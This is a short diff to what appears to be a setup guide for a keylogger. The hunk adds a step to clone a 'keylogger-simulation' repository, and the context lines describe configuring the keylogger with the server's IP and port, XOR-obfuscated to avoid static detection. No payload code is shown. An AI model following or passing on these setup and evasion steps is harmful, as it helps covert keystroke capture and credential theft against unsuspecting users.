@@ -66,6 +66,13 @@ node server.js
 
 ## 2. Keylogger Configuration
 
+First, clone the keylogger repository:
+
+```bash
+git clone https://github.com/nickrar/keylogger-simulation.git
+cd keylogger-simulation
+```
+
 The keylogger must know your server’s IP address and port. These are stored in XOR‑obfuscated bytes to avoid static detection.
 
 ### 2.1 Encode your server IP
